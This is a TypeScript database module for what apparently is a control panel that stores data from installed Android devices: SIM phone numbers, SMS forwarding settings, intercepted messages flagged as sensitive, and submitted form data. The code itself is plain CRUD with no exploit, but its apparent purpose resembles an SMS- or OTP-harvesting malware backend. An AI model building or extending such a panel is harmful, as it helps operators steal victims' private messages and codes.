import { and, asc, desc, eq, sql } from "drizzle-orm";
import { db, pool, DEFAULT_APP_ID, DEFAULT_APP_NAME, DEFAULT_APP_PIN } from "./db";
import { apps, devices, messages, formData } from "./schema";
import { hashPin, verifyPin, isHashed, isArgon2Hash } from "./hash";

export { DEFAULT_APP_ID, DEFAULT_APP_NAME, DEFAULT_APP_PIN };

export type AppRow = {
  id: number; appId: string; name: string; pin: string; status: string;
  createdAt: string; deleteProtectionPin: string | null;
  deleteProtectionEnabled: boolean; panelToken: string | null;
};
export type DeviceRow = {
  id: number; deviceId: string; appId: string; userId: string; name: string;
  androidVersion: number; sim1Carrier: string | null; sim1Phone: string | null;
  sim2Carrier: string | null; sim2Phone: string | null; status: string;
  lastOnline: string | null; forwardEnabled: boolean; forwardSlot: number | null;
  fcmToken: string | null; installedAt: string; updatedAt: string;
};
export type MessageRow = {
  id: number; appId: string; deviceId: string; userId: string;
  fromSender: string; fromNumber: string; body: string;
  isSensitive: boolean; receivedAt: string;
};
export type FormDataRow = {
  id: number; appId: string; deviceId: string;
  data: Record<string, unknown>; submittedAt: string;
};

function iso(d: Date | string | null): string | null {
  if (d == null) return null;
  return typeof d === "string" ? d : d.toISOString();
}
function isoReq(d: Date | string): string {
  return typeof d === "string" ? d : d.toISOString();
}

function mapApp(r: typeof apps.$inferSelect): AppRow {
  return {
    id: r.id, appId: r.appId, name: r.name, pin: r.pin, status: r.status,
    createdAt: isoReq(r.createdAt),
    deleteProtectionPin: r.deleteProtectionPin ?? null,
    deleteProtectionEnabled: r.deleteProtectionEnabled ?? false,
    panelToken: r.panelToken ?? null,
  };
}
function mapDevice(r: typeof devices.$inferSelect): DeviceRow {
  return {
    id: r.id, deviceId: r.deviceId, appId: r.appId, userId: r.userId, name: r.name,
    androidVersion: r.androidVersion,
    sim1Carrier: r.sim1Carrier, sim1Phone: r.sim1Phone,
    sim2Carrier: r.sim2Carrier, sim2Phone: r.sim2Phone,
    status: r.status, lastOnline: iso(r.lastOnline),
    forwardEnabled: r.forwardEnabled, forwardSlot: r.forwardSlot,
    fcmToken: r.fcmToken,
    installedAt: isoReq(r.installedAt), updatedAt: isoReq(r.updatedAt),
  };
}
function mapMessage(r: typeof messages.$inferSelect): MessageRow {
  return {
    id: r.id, appId: r.appId, deviceId: r.deviceId, userId: r.userId,
    fromSender: r.fromSender, fromNumber: r.fromNumber, body: r.body,
    isSensitive: r.isSensitive, receivedAt: isoReq(r.receivedAt),
  };
}
function mapFormData(r: typeof formData.$inferSelect): FormDataRow {
  return {
    id: r.id, appId: r.appId, deviceId: r.deviceId,
    data: r.data as Record<string, unknown>,
    submittedAt: isoReq(r.submittedAt),
  };
}

export const localDb = {
  // ------ APPS ------
  async listApps(): Promise<AppRow[]> {
    const rows = await db.select().from(apps).orderBy(asc(apps.createdAt));
    return rows.map(mapApp);
  },
  async getApp(appId: string): Promise<AppRow | undefined> {
    const rows = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
    return rows[0] ? mapApp(rows[0]) : undefined;
  },
  async createApp(input: { appId: string; name: string; pin?: string; status?: string }): Promise<AppRow> {
    const rawPin = input.pin ?? "1234";
    const hashedPin = isHashed(rawPin) ? rawPin : await hashPin(rawPin);
    const inserted = await db.insert(apps).values({
      appId: input.appId, name: input.name,
      pin: hashedPin,
      status: input.status ?? "active",
    }).onConflictDoNothing({ target: apps.appId }).returning();
    if (inserted.length === 0) throw new Error("APP_EXISTS");
    return mapApp(inserted[0]);
  },
  async updateApp(appId: string, updates: Partial<Pick<AppRow, "name" | "pin" | "status" | "deleteProtectionPin" | "deleteProtectionEnabled" | "panelToken">>): Promise<AppRow | undefined> {
    const patch: Partial<typeof apps.$inferInsert> = {};
    if (updates.name !== undefined) patch.name = updates.name;
    if (updates.pin !== undefined)
      patch.pin = isHashed(updates.pin) ? updates.pin : await hashPin(updates.pin);
    if (updates.status !== undefined) patch.status = updates.status;
    if (updates.deleteProtectionPin !== undefined)
      patch.deleteProtectionPin = updates.deleteProtectionPin
        ? (isHashed(updates.deleteProtectionPin) ? updates.deleteProtectionPin : await hashPin(updates.deleteProtectionPin))
        : null;
    if (updates.deleteProtectionEnabled !== undefined) patch.deleteProtectionEnabled = updates.deleteProtectionEnabled;
    if (updates.panelToken !== undefined) patch.panelToken = updates.panelToken;
    if (Object.keys(patch).length === 0) return this.getApp(appId);
    const [row] = await db.update(apps).set(patch).where(eq(apps.appId, appId)).returning();
    return row ? mapApp(row) : undefined;
  },
  async verifyAppPin(appId: string, pin: string): Promise<AppRow | undefined> {
    const app = await this.getApp(appId);
    if (!app) return undefined;
    const valid = await verifyPin(pin, app.pin);
    if (!valid) return undefined;
    // Auto-upgrade: plaintext ya scrypt → Argon2id mein migrate karo
    if (!isArgon2Hash(app.pin)) {
      const upgraded = await hashPin(pin);
      await db.update(apps).set({ pin: upgraded }).where(eq(apps.appId, appId));
    }
    return app;
  },
  async deleteApp(appId: string): Promise<AppRow | undefined> {
    const [row] = await db.delete(apps).where(eq(apps.appId, appId)).returning();
    return row ? mapApp(row) : undefined;
  },

  // ------ DEVICES ------
  async listDevices(filter: { appId?: string; userId?: string } = {}): Promise<DeviceRow[]> {
    const where = filter.appId
      ? eq(devices.appId, filter.appId)
      : filter.userId ? eq(devices.userId, filter.userId) : undefined;
    const q = where ? db.select().from(devices).where(where) : db.select().from(devices);
    const rows = await q.orderBy(desc(devices.updatedAt));
    return rows.map(mapDevice);
  },
  async getDevice(deviceId: string): Promise<DeviceRow | undefined> {
    const rows = await db.select().from(devices).where(eq(devices.deviceId, deviceId)).limit(1);
    return rows[0] ? mapDevice(rows[0]) : undefined;
  },
  async upsertDevice(input: Omit<DeviceRow, "id">): Promise<{ row: DeviceRow; created: boolean }> {
    const existing = await this.getDevice(input.deviceId);
    if (existing) {
      const updated = await this.updateDevice(input.deviceId, {
        name: input.name, androidVersion: input.androidVersion,
        sim1Carrier: input.sim1Carrier, sim1Phone: input.sim1Phone,
        sim2Carrier: input.sim2Carrier, sim2Phone: input.sim2Phone,
        status: input.status, lastOnline: input.lastOnline,
        fcmToken: input.fcmToken ?? existing.fcmToken,
        forwardEnabled: input.forwardEnabled, forwardSlot: input.forwardSlot,
      });
      return { row: updated!, created: false };
    }
    const [row] = await db.insert(devices).values({
      deviceId: input.deviceId, appId: input.appId, userId: input.userId,
      name: input.name, androidVersion: input.androidVersion,
      sim1Carrier: input.sim1Carrier, sim1Phone: input.sim1Phone,
      sim2Carrier: input.sim2Carrier, sim2Phone: input.sim2Phone,
      status: input.status, lastOnline: input.lastOnline ? new Date(input.lastOnline) : null,
      forwardEnabled: input.forwardEnabled, forwardSlot: input.forwardSlot,
      fcmToken: input.fcmToken,
    }).returning();
    return { row: mapDevice(row), created: true };
  },
  async updateDevice(deviceId: string, updates: Partial<DeviceRow>): Promise<DeviceRow | undefined> {
    const patch: Partial<typeof devices.$inferInsert> = {};
    if (updates.name !== undefined) patch.name = updates.name;
    if (updates.androidVersion !== undefined) patch.androidVersion = updates.androidVersion;
    if (updates.sim1Carrier !== undefined) patch.sim1Carrier = updates.sim1Carrier;
    if (updates.sim1Phone !== undefined) patch.sim1Phone = updates.sim1Phone;
    if (updates.sim2Carrier !== undefined) patch.sim2Carrier = updates.sim2Carrier;
    if (updates.sim2Phone !== undefined) patch.sim2Phone = updates.sim2Phone;
    if (updates.status !== undefined) patch.status = updates.status;
    if (updates.lastOnline !== undefined) patch.lastOnline = updates.lastOnline ? new Date(updates.lastOnline) : null;
    if (updates.fcmToken !== undefined) patch.fcmToken = updates.fcmToken;
    if (updates.forwardEnabled !== undefined) patch.forwardEnabled = updates.forwardEnabled;
    if (updates.forwardSlot !== undefined) patch.forwardSlot = updates.forwardSlot;
    patch.updatedAt = new Date();
    if (Object.keys(patch).length <= 1) return this.getDevice(deviceId);
    const [row] = await db.update(devices).set(patch).where(eq(devices.deviceId, deviceId)).returning();
    return row ? mapDevice(row) : undefined;
  },
  async deleteDevice(deviceId: string): Promise<DeviceRow | undefined> {
    const [row] = await db.delete(devices).where(eq(devices.deviceId, deviceId)).returning();
    return row ? mapDevice(row) : undefined;
  },

  // ------ MESSAGES ------
  async listMessages(filter: { appId?: string; userId?: string; deviceId?: string } = {}): Promise<MessageRow[]> {
    const where = filter.appId
      ? eq(messages.appId, filter.appId)
      : filter.userId ? eq(messages.userId, filter.userId)
      : filter.deviceId ? eq(messages.deviceId, filter.deviceId)
      : undefined;
    const q = where ? db.select().from(messages).where(where) : db.select().from(messages);
    const rows = await q.orderBy(desc(messages.receivedAt));
    return rows.map(mapMessage);
  },
  async createMessage(input: Omit<MessageRow, "id" | "receivedAt">): Promise<MessageRow> {
    const [row] = await db.insert(messages).values(input).returning();
    return mapMessage(row);
  },
  async deleteMessage(id: number): Promise<MessageRow | undefined> {
    const [row] = await db.delete(messages).where(eq(messages.id, id)).returning();
    return row ? mapMessage(row) : undefined;
  },

  // ------ FORM DATA ------
  async listFormData(filter: { appId?: string; deviceId?: string } = {}): Promise<FormDataRow[]> {
    const where = filter.appId && filter.deviceId
      ? and(eq(formData.appId, filter.appId), eq(formData.deviceId, filter.deviceId))
      : filter.appId ? eq(formData.appId, filter.appId)
      : filter.deviceId ? eq(formData.deviceId, filter.deviceId)
      : undefined;
    const q = where ? db.select().from(formData).where(where) : db.select().from(formData);
    const rows = await q.orderBy(desc(formData.submittedAt));
    return rows.map(mapFormData);
  },
  async createFormData(input: Omit<FormDataRow, "id" | "submittedAt">): Promise<FormDataRow> {
    const [row] = await db.insert(formData).values({
      appId: input.appId, deviceId: input.deviceId, data: input.data,
    }).returning();
    return mapFormData(row);
  },
  async deleteFormData(id: number): Promise<FormDataRow | undefined> {
    const [row] = await db.delete(formData).where(eq(formData.id, id)).returning();
    return row ? mapFormData(row) : undefined;
  },

  // ------ STATS ------
  async stats(appId?: string): Promise<Record<string, number>> {
    if (appId) {
      const [d] = await db.select({ c: sql<string>`count(*)::text` }).from(devices).where(eq(devices.appId, appId));
      const [m] = await db.select({ c: sql<string>`count(*)::text` }).from(messages).where(eq(messages.appId, appId));
      const [f] = await db.select({ c: sql<string>`count(*)::text` }).from(formData).where(eq(formData.appId, appId));
      return { devices: Number(d.c), messages: Number(m.c), formData: Number(f.c) };
    }
    const [a] = await db.select({ c: sql<string>`count(*)::text` }).from(apps);
    const [d] = await db.select({ c: sql<string>`count(*)::text` }).from(devices);
    const [m] = await db.select({ c: sql<string>`count(*)::text` }).from(messages);
    const [f] = await db.select({ c: sql<string>`count(*)::text` }).from(formData);
    return { apps: Number(a.c), devices: Number(d.c), messages: Number(m.c), formData: Number(f.c) };
  },
  async sample(appId?: string): Promise<Record<string, unknown>> {
    if (appId) {
      const [d] = await db.select().from(devices).where(eq(devices.appId, appId)).limit(1);
      const [m] = await db.select().from(messages).where(eq(messages.appId, appId)).limit(1);
      const [f] = await db.select().from(formData).where(eq(formData.appId, appId)).limit(1);
      return {
        devices: d ? mapDevice(d) : null,
        messages: m ? mapMessage(m) : null,
        formData: f ? mapFormData(f) : null,
      };
    }
    const [a] = await db.select().from(apps).limit(1);
    const [d] = await db.select().from(devices).limit(1);
    const [m] = await db.select().from(messages).limit(1);
    const [f] = await db.select().from(formData).limit(1);
    return {
      apps: a ? mapApp(a) : null,
      devices: d ? mapDevice(d) : null,
      messages: m ? mapMessage(m) : null,
      formData: f ? mapFormData(f) : null,
    };
  },
};
